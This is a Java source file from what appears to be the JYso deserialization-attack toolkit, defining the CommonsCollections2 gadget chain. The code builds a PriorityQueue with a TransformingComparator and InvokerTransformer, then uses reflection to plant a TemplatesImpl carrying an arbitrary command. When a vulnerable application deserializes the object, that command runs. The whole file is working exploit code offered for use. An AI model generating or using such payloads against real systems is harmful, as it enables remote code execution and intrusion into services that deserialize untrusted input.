package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.InvokerTransformer;

import java.util.PriorityQueue;
import java.util.Queue;


@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"org.apache.commons:commons-collections4:4.0"})
@Authors({Authors.FROHOFF})
public class CommonsCollections2 implements ObjectPayload<Queue<Object>> {

    public Queue<Object> getObject(String command) throws Exception {
        final Object templates;
        templates = Gadgets.createTemplatesImpl(command);
        final InvokerTransformer    transformer = new InvokerTransformer("toString", new Class[0], new Object[0]);
        final PriorityQueue<Object> queue       = new PriorityQueue<Object>(2, new TransformingComparator(transformer));
        queue.add(1);
        queue.add(1);

        Reflections.setFieldValue(transformer, "iMethodName", "newTransformer");
        Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});

        return queue;
    }

}
